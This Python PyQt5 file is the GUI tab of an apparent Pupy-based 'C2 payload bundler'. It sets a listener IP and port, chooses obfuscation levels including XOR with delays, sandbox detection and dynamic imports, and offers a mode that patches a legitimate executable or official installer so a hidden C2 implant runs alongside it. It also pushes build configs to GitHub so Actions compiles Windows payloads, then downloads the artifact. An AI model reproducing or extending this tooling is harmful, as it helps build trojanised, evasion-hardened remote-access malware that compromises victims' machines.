#!/usr/bin/env python3
"""Bundler Tab - C2 Payload Bundler"""

import sys
from pathlib import Path
from PyQt5.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QComboBox,
    QMessageBox,
    QProgressBar,
    QGroupBox,
    QSpinBox,
    QTextEdit,
    QFileDialog,
    QCheckBox,
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QFont


class BundlerWorker(QThread):
    """Worker thread for bundling"""

    progress = pyqtSignal(str)
    finished = pyqtSignal(bool)

    def __init__(
        self,
        listener_ip,
        listener_port,
        obfuscation,
        platform="windows",
        patch_file=None,
    ):
        super().__init__()
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.obfuscation = obfuscation
        self.platform = platform
        self.patch_file = patch_file

    def run(self):
        try:
            import contextlib, sys

            class _Emitter:
                def __init__(self, emit_fn):
                    self.emit = emit_fn

                def write(self, s):
                    if not s:
                        return
                    for line in str(s).splitlines():
                        if line.strip():
                            self.emit(line)

                def flush(self):
                    pass

            try:
                obfuscation_level = int(self.obfuscation)
            except:
                obfuscation_map = {
                    "Level 1": 1,
                    "Level 2": 2,
                    "Level 3": 3,
                    "Level 4": 4,
                    "Level 5": 5,
                }
                obfuscation_level = 2
                for key, val in obfuscation_map.items():
                    if key in str(self.obfuscation):
                        obfuscation_level = val
                        break

            self.progress.emit("[*] === C2 BUNDLER ===")
            self.progress.emit(f"[*] Listener: {self.listener_ip}:{self.listener_port}")
            self.progress.emit(f"[*] Obfuscation: Level {obfuscation_level}")
            self.progress.emit(f"[*] Platform: {self.platform}")
            if self.patch_file:
                self.progress.emit(f"[*] Patch Mode: {Path(self.patch_file).name}")
            self.progress.emit("")

            sys.path.insert(0, str(Path(__file__).parent))
            from c2_bundler_simple import create_bundled_payload

            self.progress.emit("[*] Creating C2 payload...")

            # Si patch_file existe, on l'intègre
            if self.patch_file:
                self.progress.emit(f"[*] Patching file: {self.patch_file}")
                self.progress.emit(f"[*] Mode: Wrapper (original app + C2 background)")

            # Rediriger stdout/stderr vers l'UI pendant la compilation
            emitter = _Emitter(self.progress.emit)
            with contextlib.redirect_stdout(emitter), contextlib.redirect_stderr(
                emitter
            ):
                success = create_bundled_payload(
                    self.listener_ip,
                    self.listener_port,
                    obfuscation_level,
                    self.platform,
                    self.patch_file,
                )

            if success:
                self.progress.emit("")
                self.progress.emit("[+] SUCCESS!")
                if self.patch_file:
                    self.progress.emit(
                        f"[+] Location: dist/{Path(self.patch_file).name}"
                    )
                    self.progress.emit("[+] Patched file ready!")
                    self.progress.emit("[+] Original app will run + C2 in background!")
                else:
                    self.progress.emit("[+] Location: dist/c2_payload.exe")
                    self.progress.emit("[+] C2 is hidden and obfuscated!")
                self.finished.emit(True)
            else:
                self.progress.emit("[!] FAILED")
                self.finished.emit(False)

        except Exception as e:
            self.progress.emit(f"[!] ERROR: {str(e)}")
            import traceback

            self.progress.emit(traceback.format_exc())
            self.finished.emit(False)


class BundlerTab(QWidget):
    """Bundler interface"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent = parent
        self.bundler_worker = None
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        # Mode Selection
        mode_group = QGroupBox("📦 Bundle Mode")
        mode_layout = QVBoxLayout()

        self.patch_mode_checkbox = QCheckBox(
            "Patch existing file (embed C2 in legitimate app)"
        )
        self.patch_mode_checkbox.setChecked(False)
        self.patch_mode_checkbox.stateChanged.connect(self.toggle_patch_mode)
        mode_layout.addWidget(self.patch_mode_checkbox)

        # File selection
        file_layout = QHBoxLayout()
        self.file_input = QLineEdit()
        self.file_input.setPlaceholderText("Select .exe or .app to patch...")
        self.file_input.setEnabled(False)
        file_layout.addWidget(self.file_input)

        self.browse_btn = QPushButton("📁 Browse")
        self.browse_btn.setEnabled(False)
        self.browse_btn.clicked.connect(self.browse_file)
        file_layout.addWidget(self.browse_btn)
        mode_layout.addLayout(file_layout)

        # Optional Patch by URL (for GitHub workflow)
        url_layout = QHBoxLayout()
        self.patch_url_input = QLineEdit()
        self.patch_url_input.setPlaceholderText(
            "or paste URL to official installer (http/https)..."
        )
        self.patch_url_input.setEnabled(False)
        url_layout.addWidget(QLabel("Patch URL (optional):"))
        url_layout.addWidget(self.patch_url_input)
        mode_layout.addLayout(url_layout)

        mode_group.setLayout(mode_layout)
        layout.addWidget(mode_group)

        # Configuration
        config_group = QGroupBox("⚙️ C2 Configuration")
        config_layout = QVBoxLayout()

        ip_layout = QHBoxLayout()
        ip_layout.addWidget(QLabel("Listener IP:"))
        self.listener_ip_input = QLineEdit()
        self.listener_ip_input.setText("192.168.1.40")
        ip_layout.addWidget(self.listener_ip_input)
        config_layout.addLayout(ip_layout)

        port_layout = QHBoxLayout()
        port_layout.addWidget(QLabel("Listener Port:"))
        self.listener_port_spinbox = QSpinBox()
        self.listener_port_spinbox.setValue(4444)
        self.listener_port_spinbox.setMinimum(1)
        self.listener_port_spinbox.setMaximum(65535)
        port_layout.addWidget(self.listener_port_spinbox)
        config_layout.addLayout(port_layout)

        obf_layout = QHBoxLayout()
        obf_layout.addWidget(QLabel("Obfuscation:"))
        self.obfuscation_combo = QComboBox()
        self.obfuscation_combo.addItems(
            [
                "Level 1 - Base64",
                "Level 2 - XOR + Delays (RECOMMENDED)",
                "Level 3 - Sandbox Detection",
                "Level 4 - Dynamic Imports",
                "Level 5 - MAXIMUM",
            ]
        )
        self.obfuscation_combo.setCurrentIndex(1)
        obf_layout.addWidget(self.obfuscation_combo)
        config_layout.addLayout(obf_layout)

        plat_layout = QHBoxLayout()
        plat_layout.addWidget(QLabel("Platform:"))
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["Windows (.exe)", "macOS (.app)", "Linux"])
        plat_layout.addWidget(self.platform_combo)
        config_layout.addLayout(plat_layout)

        config_group.setLayout(config_layout)
        layout.addWidget(config_group)

        # GitHub Actions Info
        github_group = QGroupBox("🔧 GitHub Actions (Windows PE Compilation)")
        github_layout = QVBoxLayout()

        github_info = QLabel(
            "✅ GitHub Actions is ACTIVE!\n\n"
            "To compile Windows PE x64:\n"
            "1. Edit payload.py in your repo\n"
            "2. git add payload.py && git commit && git push\n"
            "3. Check GitHub Actions tab\n"
            "4. Download artifact: c2-payload-windows\n\n"
            "Workflow: .github/workflows/build-windows-pe.yml"
        )
        github_info.setStyleSheet("color: #4CAF50; padding: 10px;")
        github_layout.addWidget(github_info)

        github_group.setLayout(github_layout)
        layout.addWidget(github_group)

        # GitHub Token status + helper
        token_group = QGroupBox("🔐 GitHub Token")
        token_layout = QHBoxLayout()
        self.token_status_label = QLabel()
        self._refresh_token_status()
        self.open_token_btn = QPushButton("Ouvrir le dossier du token…")
        self.open_token_btn.clicked.connect(self._open_token_folder)
        self.refresh_token_btn = QPushButton("Rafraîchir")
        self.refresh_token_btn.clicked.connect(self._refresh_token_status)
        token_layout.addWidget(self.token_status_label)
        token_layout.addStretch(1)
        token_layout.addWidget(self.open_token_btn)
        token_layout.addWidget(self.refresh_token_btn)
        token_group.setLayout(token_layout)
        layout.addWidget(token_group)

        # Bundler Buttons
        button_layout = QHBoxLayout()

        self.bundle_btn = QPushButton("🔨 Build Local (macOS)")
        self.bundle_btn.setStyleSheet(
            "background-color: #4CAF50; color: white; font-weight: bold; padding: 10px;"
        )
        self.bundle_btn.clicked.connect(self.start_bundling)
        button_layout.addWidget(self.bundle_btn)

        self.github_build_btn = QPushButton("☁️ Build Windows (GitHub)")
        self.github_build_btn.setStyleSheet(
            "background-color: #0366d6; color: white; font-weight: bold; padding: 10px;"
        )
        self.github_build_btn.clicked.connect(self.build_on_github)
        button_layout.addWidget(self.github_build_btn)

        layout.addLayout(button_layout)

        # Progress
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        layout.addWidget(self.progress_bar)

        # Output
        output_group = QGroupBox("📊 Output")
        output_layout = QVBoxLayout()
        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Courier", 9))
        output_layout.addWidget(self.output_text)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)

        self.setLayout(layout)

    def toggle_patch_mode(self, state):
        """Toggle patch mode UI"""
        enabled = state == Qt.Checked
        self.file_input.setEnabled(enabled)
        self.browse_btn.setEnabled(enabled)
        self.patch_url_input.setEnabled(enabled)

    def browse_file(self):
        """Browse for file to patch"""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select file to patch",
            "",
            "Executables (*.exe *.app);;All Files (*.*)",
        )
        if file_path:
            self.file_input.setText(file_path)

    def start_bundling(self):
        listener_ip = self.listener_ip_input.text().strip()
        listener_port = self.listener_port_spinbox.value()

        if not listener_ip:
            QMessageBox.warning(self, "Error", "Enter listener IP")
            return

        if listener_port <= 0 or listener_port > 65535:
            QMessageBox.warning(self, "Error", "Invalid port")
            return

        self.bundle_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.output_text.clear()

        platform_map = {
            "Windows (.exe)": "windows",
            "macOS (.app)": "macos",
            "Linux": "linux",
        }
        platform = platform_map.get(self.platform_combo.currentText(), "windows")

        # Get patch file if enabled
        patch_file = None
        if self.patch_mode_checkbox.isChecked():
            patch_file = self.file_input.text().strip()
            if not patch_file:
                QMessageBox.warning(self, "Error", "Select a file to patch")
                return

        self.bundler_worker = BundlerWorker(
            listener_ip,
            listener_port,
            self.obfuscation_combo.currentText(),
            platform,
            patch_file,
        )

        self.bundler_worker.progress.connect(self.on_progress)
        self.bundler_worker.finished.connect(self.on_finished)
        self.bundler_worker.start()

    def on_progress(self, message):
        self.output_text.append(message)

    def on_finished(self, success):
        self.bundle_btn.setEnabled(True)
        self.progress_bar.setVisible(False)

        if success:
            QMessageBox.information(
                self, "Success", "Payload created!\n\nLocation: dist/c2_payload.exe"
            )
        else:
            QMessageBox.critical(self, "Error", "Bundling failed")

    def build_on_github(self):
        """Trigger GitHub Actions build for Windows"""
        import subprocess
        import json
        from datetime import datetime
        import os
        import time
        import urllib.request
        import urllib.parse
        import zipfile
        import io

        listener_ip = self.listener_ip_input.text().strip()
        listener_port = self.listener_port_spinbox.value()

        if not listener_ip:
            QMessageBox.warning(self, "Error", "Enter listener IP")
            return

        # Get obfuscation level
        obfuscation_text = self.obfuscation_combo.currentText()
        obfuscation_level = 5
        if "Level 1" in obfuscation_text:
            obfuscation_level = 1
        elif "Level 2" in obfuscation_text:
            obfuscation_level = 2
        elif "Level 3" in obfuscation_text:
            obfuscation_level = 3
        elif "Level 4" in obfuscation_text:
            obfuscation_level = 4

        # Optional patch URL (used by GitHub workflow only)
        patch_url = None
        if self.patch_mode_checkbox.isChecked():
            url = self.patch_url_input.text().strip()
            if url:
                patch_url = url

        # Confirmation
        msg = f"""🚀 GitHub Actions Windows Build

Configuration:
• IP: {listener_ip}
• Port: {listener_port}
• Obfuscation: Level {obfuscation_level}
• Patch URL: {patch_url or '(none)'}

Cette action va:
1. Créer un fichier de config
2. Commit + Push vers GitHub
3. Déclencher la compilation Windows
4. Télécharger automatiquement l'artifact (si token GitHub dispo)

Continuer?"""

        reply = QMessageBox.question(
            self, "Confirmation", msg, QMessageBox.Yes | QMessageBox.No
        )

        if reply != QMessageBox.Yes:
            return

        try:
            # Create config file
            config = {
                "listener_ip": listener_ip,
                "listener_port": listener_port,
                "obfuscation_level": obfuscation_level,
                "platform": "windows",
                "timestamp": datetime.now().isoformat(),
            }
            if patch_url:
                config["patch_url"] = patch_url

            config_path = Path.cwd() / "build_config.json"
            with open(config_path, "w") as f:
                json.dump(config, f, indent=2)

            self.output_text.append("\n[*] Configuration créée")
            self.output_text.append(f"[*] IP: {listener_ip}:{listener_port}")
            self.output_text.append(f"[*] Obfuscation: Level {obfuscation_level}\n")

            # Git operations
            self.output_text.append("[*] Git add...")
            result = subprocess.run(
                ["git", "add", "build_config.json"],
                capture_output=True,
                text=True,
                cwd=str(Path.cwd()),
            )

            if result.returncode != 0:
                raise Exception(f"Git add failed: {result.stderr}")

            self.output_text.append("[*] Git commit...")
            commit_msg = f"🔧 Windows Build: IP={listener_ip} Port={listener_port} Obf={obfuscation_level}"
            result = subprocess.run(
                ["git", "commit", "-m", commit_msg],
                capture_output=True,
                text=True,
                cwd=str(Path.cwd()),
            )

            if result.returncode != 0 and "nothing to commit" not in result.stdout:
                raise Exception(f"Git commit failed: {result.stderr}")

            self.output_text.append("[*] Git push...")
            result = subprocess.run(
                ["git", "push"], capture_output=True, text=True, cwd=str(Path.cwd())
            )

            if result.returncode != 0:
                raise Exception(f"Git push failed: {result.stderr}")

            self.output_text.append("\n✅ Push réussi vers GitHub!")

            # Try to auto-download artifact using GitHub API
            token = self._get_github_token()
            if not token:
                self._refresh_token_status()
                self.output_text.append("\nℹ️ Aucun token GitHub détecté.")
                self.output_text.append("➡️ Définis GITHUB_TOKEN dans l'environnement")
                self.output_text.append(
                    "   ou place le token dans ~/.pupy_manager/github_token"
                )
                self.output_text.append(
                    "➡️ Je n'ai pas les droits pour télécharger automatiquement."
                )
                self.output_text.append(
                    "Tu peux télécharger l'artifact ici: https://github.com/kalilBelgoumri/pupy-c2-manager-macos/actions\n"
                )
                QMessageBox.information(
                    self,
                    "✅ Push OK",
                    "Push réussi. Le workflow démarre.\n\n"
                    "Sans token GitHub, je ne peux pas télécharger automatiquement.\n"
                    "Va sur GitHub Actions pour récupérer l'artifact.",
                )
                return

            # Probe token/scopes to give clearer guidance
            owner, repo = self._get_repo_owner_repo()
            if not owner or not repo:
                self.output_text.append(
                    "[!] Impossible de détecter owner/repo depuis git remote"
                )
                return
            for line in self._probe_token(token, owner, repo):
                self.output_text.append(line)

            self.output_text.append("\n🔄 Attente de la compilation GitHub Actions...")

            run = self._wait_for_latest_run(owner, repo, token, timeout=600)
            if not run:
                self.output_text.append("[!] Timeout en attendant le workflow (10 min)")
                return

            if run.get("conclusion") != "success":
                self.output_text.append(
                    f"[!] Workflow terminé avec statut: {run.get('conclusion')}"
                )
                return

            # Récupérer le statut du smoke test
            smoke_status = None
            smoke_url = run.get("html_url")
            try:
                jobs = self._get_run_jobs(owner, repo, run["id"], token)
                smoke_status = self._summarize_smoke_test(jobs)
            except Exception as e:
                self.output_text.append(f"[!] Erreur API GitHub (jobs/steps): {e}")

            if smoke_status is None:
                self.output_text.append(
                    "[i] Smoke test: inconnu (pas d'accès aux jobs/steps)"
                )
            else:
                passed, details, link = smoke_status
                if passed:
                    self.output_text.append("✅ Smoke test: PASS")
                    if link:
                        self.output_text.append(f"→ Détails: {link}")
                    QMessageBox.information(
                        self,
                        "Build OK",
                        "Compilation Windows terminée avec succès.\nSmoke test: PASS\n\nL'artifact va être téléchargé si le token le permet.",
                    )
                else:
                    self.output_text.append("❌ Smoke test: FAIL")
                    if details:
                        self.output_text.append(f"Détails: {details}")
                    if link:
                        self.output_text.append(f"→ Détails: {link}")
                    QMessageBox.warning(
                        self,
                        "Build terminée - test KO",
                        "La compilation Windows est terminée mais le smoke test a échoué.\nVérifie les logs sur GitHub Actions.",
                    )

            artifact_path = self._download_artifact(owner, repo, run["id"], token)
            if artifact_path:
                self.output_text.append(f"\n✅ Artifact téléchargé: {artifact_path}")
                QMessageBox.information(
                    self, "Success", f"Artifact téléchargé:\n{artifact_path}"
                )
            else:
                self.output_text.append("[!] Échec du téléchargement de l'artifact")
                # Fournir le lien vers la page du run pour récupération manuelle
                if smoke_url:
                    self.output_text.append(
                        f"→ Ouvre la page du run pour télécharger l'artifact: {smoke_url}"
                    )

        except Exception as e:
            self.output_text.append(f"\n[!] ERROR: {str(e)}\n")
            QMessageBox.critical(self, "Error", f"Échec du push GitHub:\n{str(e)}")

    def _refresh_token_status(self):
        token, source = self._get_github_token(return_source=True)
        if token:
            masked = self._mask_token(token)
            self.token_status_label.setText(
                f"Statut: 🟢 Token détecté ({source}) {masked}"
            )
            self.token_status_label.setStyleSheet("color: #2e7d32;")
        else:
            self.token_status_label.setText(
                "Statut: 🔴 Aucun token trouvé (env: GITHUB_TOKEN/GH_TOKEN, fichier: ~/.pupy_manager/github_token)"
            )
            self.token_status_label.setStyleSheet("color: #c62828;")

    def _mask_token(self, token: str) -> str:
        try:
            if len(token) <= 8:
                return "(masqué)"
            return f"[{token[:4]}…{token[-4:]}]"
        except Exception:
            return "(masqué)"

    def _open_token_folder(self):
        from pathlib import Path
        import subprocess

        token_dir = Path.home() / ".pupy_manager"
        token_dir.mkdir(parents=True, exist_ok=True)
        try:
            subprocess.run(["open", str(token_dir)])
        except Exception:
            pass

    def _get_github_token(self, return_source: bool = False):
        # Prefer environment (check common names)
        import os

        env_names = ["GITHUB_TOKEN", "GH_TOKEN", "GITHUB_PAT", "PERSONAL_ACCESS_TOKEN"]
        for name in env_names:
            val = os.environ.get(name)
            if val and val.strip():
                token = val.strip()
                if return_source:
                    return token, f"env:{name}"
                return token
        # Fallback to file(s)
        from pathlib import Path

        candidates = [
            Path.home() / ".pupy_manager" / "github_token",
            Path.home() / "github_token",
            Path.cwd() / ".github_token",
            Path.cwd() / "github_token",
        ]
        for token_path in candidates:
            if token_path.exists():
                try:
                    token = token_path.read_text(encoding="utf-8").strip()
                    if token:
                        if return_source:
                            return token, f"file:{token_path}"
                        return token
                except Exception:
                    pass
        if return_source:
            return None, None
        return None

    def _get_repo_owner_repo(self):
        import subprocess

        try:
            res = subprocess.run(
                ["git", "remote", "get-url", "origin"], capture_output=True, text=True
            )
            if res.returncode != 0:
                return None, None
            url = res.stdout.strip()
            # Support https://github.com/owner/repo.git
            if url.startswith("https://github.com/"):
                parts = url.replace("https://github.com/", "").rstrip(".git").split("/")
                if len(parts) >= 2:
                    return parts[0], parts[1]
        except:
            pass
        return None, None

    def _http_json(self, url, token):
        import urllib.request, json

        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Bearer {token}")
        req.add_header("Accept", "application/vnd.github+json")
        req.add_header("User-Agent", "pupy-c2-manager-macos/1.0")
        req.add_header("X-GitHub-Api-Version", "2022-11-28")
        with urllib.request.urlopen(req, timeout=30) as r:
            data = r.read()
        return json.loads(data.decode("utf-8"))

    def _get_run_jobs(self, owner, repo, run_id, token):
        """Retourne la liste des jobs et steps d'un run"""
        return self._http_json(
            f"https://api.github.com/repos/{owner}/{repo}/actions/runs/{run_id}/jobs?per_page=100",
            token,
        )

    def _summarize_smoke_test(self, jobs_payload):
        """Analyse les jobs/steps pour trouver l'étape 'Smoke test executables (SELFTEST)'.
        Retourne (passed: bool, details: str|None, link: str|None) ou None si introuvable.
        """
        try:
            jobs = jobs_payload.get("jobs", [])
            for job in jobs:
                steps = job.get("steps", [])
                for st in steps:
                    name = st.get("name", "")
                    if "Smoke test executables" in name:
                        concl = st.get("conclusion") or job.get("conclusion")
                        link = job.get("html_url")
                        if concl == "success":
                            return (True, None, link)
                        else:
                            return (False, f"Conclusion: {concl}", link)
            # Si step introuvable, tenter via conclusion de job
            for job in jobs:
                if job.get("name", "").lower().startswith("build") and job.get(
                    "conclusion"
                ):
                    concl = job.get("conclusion")
                    link = job.get("html_url")
                    return (
                        concl == "success",
                        f"Job '{job.get('name')}' -> {concl}",
                        link,
                    )
        except Exception:
            pass
        return None

    def _wait_for_latest_run(self, owner, repo, token, timeout=600):
        import time

        # Find the latest run for the workflow on main
        start = time.time()
        workflow = "build-windows-pe.yml"
        while time.time() - start < timeout:
            try:
                runs = self._http_json(
                    f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow}/runs?branch=main&per_page=1",
                    token,
                )
            except Exception as e:
                self.output_text.append(f"[!] Erreur API GitHub (list runs): {e}")
                return None
            items = runs.get("workflow_runs", [])
            if items:
                run = items[0]
                status = run.get("status")
                conclusion = run.get("conclusion")
                self.output_text.append(f"[*] Workflow status: {status} / {conclusion}")
                if status == "completed":
                    return run
            time.sleep(5)
        return None

    def _download_artifact(self, owner, repo, run_id, token):
        import urllib.request, io, zipfile, os

        # List artifacts for run
        try:
            artifacts = self._http_json(
                f"https://api.github.com/repos/{owner}/{repo}/actions/runs/{run_id}/artifacts",
                token,
            )
        except Exception as e:
            self.output_text.append(f"[!] Erreur API GitHub (artifacts): {e}")
            return None
        items = artifacts.get("artifacts", [])
        if not items:
            return None
        # Prefer c2-payload-windows
        art = None
        for a in items:
            if a.get("name") == "c2-payload-windows":
                art = a
                break
        if not art:
            art = items[0]
        # Download zip
        download_url = art.get("archive_download_url")
        req = urllib.request.Request(download_url)
        req.add_header("Authorization", f"Bearer {token}")
        req.add_header("Accept", "application/vnd.github+json")
        req.add_header("User-Agent", "pupy-c2-manager-macos/1.0")
        try:
            with urllib.request.urlopen(req, timeout=60) as r:
                content = r.read()
        except Exception as e:
            self.output_text.append(f"[!] Erreur API GitHub (download artifact): {e}")
            self.output_text.append(
                "[i] Assure-toi que le token a les permissions nécessaires: \n- Classic PAT: repo + workflow\n- Fine-grained PAT: Actions: Read sur ce repo"
            )
            return None
        zf = zipfile.ZipFile(io.BytesIO(content))
        # Extract executables to local dist/
        dist_dir = Path.cwd() / "dist"
        dist_dir.mkdir(exist_ok=True)
        extracted = None
        for name in zf.namelist():
            if name.lower().endswith(".exe"):
                target = dist_dir / Path(name).name
                with zf.open(name) as src, open(target, "wb") as dst:
                    dst.write(src.read())
                extracted = str(target)
        return extracted

    def _probe_token(self, token, owner=None, repo=None):
        """Probe token scopes and access. Returns text lines for UI."""
        import urllib.request, json

        lines = []
        # Probe /user to get scopes header
        try:
            req = urllib.request.Request("https://api.github.com/user")
            req.add_header("Authorization", f"Bearer {token}")
            req.add_header("Accept", "application/vnd.github+json")
            req.add_header("User-Agent", "pupy-c2-manager-macos/1.0")
            with urllib.request.urlopen(req, timeout=15) as r:
                scopes = r.headers.get("X-OAuth-Scopes", "")
                login = json.loads(r.read().decode("utf-8")).get("login")
            lines.append(f"[*] Token pour: {login}")
            if scopes:
                lines.append(f"[*] Scopes (classic): {scopes}")
            else:
                lines.append(
                    "[*] Token fine-grained ou scopes non indiqués (header vide)"
                )
        except Exception as e:
            lines.append(f"[!] Impossible de valider le token (/user): {e}")
        # Optional: probe actions list
        if owner and repo:
            try:
                _ = self._http_json(
                    f"https://api.github.com/repos/{owner}/{repo}/actions/workflows",
                    token,
                )
                lines.append("[*] Accès Actions: OK")
            except Exception as e:
                lines.append(f"[!] Accès Actions refusé: {e}")
        return lines


# Usage: Bundler Tab → Config → "Start Bundling"
#        → dist/c2_payload.exe
